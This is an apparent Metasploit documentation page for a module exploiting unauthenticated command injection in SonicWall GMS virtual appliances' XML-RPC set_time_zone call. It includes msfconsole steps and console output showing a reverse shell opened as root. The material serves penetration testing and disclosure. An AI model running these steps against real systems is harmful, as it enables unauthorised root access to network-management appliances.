{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/unix/sonicwall/sonicwall_xmlrpc_rce","result":{"data":{"moduleMetadataJson":{"id":"f00765bc-8d0b-56ae-a23a-6cf8724689ad","name":"SonicWall Global Management System XMLRPC set_time_zone Unauth RCE","fullname":"exploit/unix/sonicwall/sonicwall_xmlrpc_rce","description":"This module exploits a vulnerability in SonicWall Global\n        Management System Virtual Appliance versions 8.1 (Build 8110.1197)\n        and below. This virtual appliance can be downloaded from\n        http://www.sonicwall.com/products/sonicwall-gms/ and is used 'in a\n        holistic way to manage your entire network security environment.'\n\n        These vulnerable versions (8.1 Build 8110.1197 and below) do not\n        prevent unauthenticated, external entities from making XML-RPC\n        requests to port 21009 of the virtual app. After the XML-RPC call\n        is made, a shell script is called like so:\n        'timeSetup.sh --tz=\"`command injection here`\"' --usentp=\"blah\"'.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/unix/sonicwall/sonicwall_xmlrpc_rce","documentationSlug":"/modules/documentation/exploit/unix/sonicwall/sonicwall_xmlrpc_rce","referencesSlug":"/modules/references/exploit/unix/sonicwall/sonicwall_xmlrpc_rce"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>sonicwall<em>xmlrpc</em>rce is a remote exploit against SonicWall Global Management\nSystem Virtual Appliance and is written by Michael Flanders of Trend\nMicro Zero Day Initiative with assistance by @kernelsmith of Trend Micro Zero\nDay Initiative. It is considered a reliable exploit, and allows you to remotely\nexecute commands as root.</p>\n<ul>\n<li>\n<p>This exploit works against a vulnerable SonicWall Global Management System\nVirtual Appliance (A.K.A. Sonicwall GMSVP) of versions 8.1 (Build 8110.1197) and\nearlier. The virtual appliance can be downloaded here:</p>\n<ul>\n<li><a href=\"http://www.sonicwall.com/products/sonicwall-gms/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://www.sonicwall.com/products/sonicwall-gms/</a></li>\n</ul>\n</li>\n<li>This module exploits the virtual appliance's lack of checking on user-supplied\nparameters to XML-RPC calls to a vulnerable Java service running on port 21009.\nA call to a shell script is made using this user-supplied parameter contained in\nbackticks allowing command substitution and remote code execution.</li>\n<li>To reliably determine whether the target virtual appliance is vulnerable,\nyou will have to examine the web console's login page. This is also automatically\ndone in the check function of the exploit.</li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ul>\n<li class=\"task-list-item\"><input type=\"checkbox\" checked disabled> Start <code class=\"language-text\">msfconsole</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" checked disabled> <code class=\"language-text\">use exploit/unix/sonicwall/sonicwall_xmlrpc_rce</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" checked disabled> <code class=\"language-text\">set RHOST</code> to the IP address of the vulnerable virtual appliance</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" checked disabled> <code class=\"language-text\">set RPORT</code> to 21009</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" checked disabled> <code class=\"language-text\">set payload</code> to the desired payload</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" checked disabled> set any additional options for the payload e.g. LHOST/LPORT</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" checked disabled> <code class=\"language-text\">exploit</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" checked disabled> <strong>Verify</strong> that you get a shell</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" checked disabled> <strong>Verify</strong> that you do not crash</li>\n</ul>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">set SSL [true/false]</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<ul>\n<li>Set this true/false depending on whether the instance of SonicWall GMSVP has\nbeen configured to use SSL.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">set WEB_SERVER_PORT [port]</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<ul>\n<li>This is the port of the login page for the web server/virtual appliance. For\nSonicWall GMVSP this is typically <a href=\"http://%5Bip%5D:80\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://[ip]:80</a>; therefore, this option is set\nby default to 80 (or 443 if <code class=\"language-text\">set SSL true</code>).</li>\n</ul>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<ul>\n<li>This is example output from a normal usage/scenario. This console output is for\nSonicWall GMSVP version 8.0 (Build 8046.1396):</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/unix/sonicwall/sonicwall_xmlrpc_rce\nmsf exploit(unix/sonicwall/sonicwall_xmlrpc_rce) &gt; show options\n\nModule options (exploit/unix/sonicwall/sonicwall_xmlrpc_rce):\n\n   Name             Current Setting  Required  Description\n   ----             ---------------  --------  -----------\n   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOST                             yes       The target address\n   RPORT            80               yes       The target port (TCP)\n   SSL              false            no        Negotiate SSL/TLS for outgoing connections\n   VHOST                             no        HTTP server virtual host\n   WEB_SERVER_PORT                   no        Port of web console login page.\n                                             Defaults to 80/443 depending on SSL.\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   SonicWall Global Management System Virtual Appliance\n\n\nmsf exploit(unix/sonicwall/sonicwall_xmlrpc_rce) &gt; set RPORT 21009\nRPORT =&gt; 21009\n\nmsf exploit(unix/sonicwall/sonicwall_xmlrpc_rce) &gt; set RHOST 192.168.152.173\nRHOST =&gt; 192.168.152.173\n\nmsf exploit(unix/sonicwall/sonicwall_xmlrpc_rce) &gt; set payload cmd/unix/reverse\npayload =&gt; cmd/unix/reverse\n\nmsf exploit(unix/sonicwall/sonicwall_xmlrpc_rce) &gt; set LHOST 192.168.152.193\nLHOST =&gt; 192.168.152.193\n\nmsf exploit(unix/sonicwall/sonicwall_xmlrpc_rce) &gt; exploit\n\n[*] Started reverse TCP double handler on 192.168.152.193:4444\n[*] The target appears to be vulnerable, continuing exploit...\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[*] Command: echo H7sn3KYXeuCZy27Q;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[*] Reading from socket B\n[*] B: &quot;H7sn3KYXeuCZy27Q\\n&quot;\n[*] Matching...\n[*] A is input...\n[*] Command shell session 1 opened (192.168.152.193:4444 -&gt; 192.168.152.173:44698) at 2018-07-05 12:30:56 -0400</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"f00765bc-8d0b-56ae-a23a-6cf8724689ad"}}}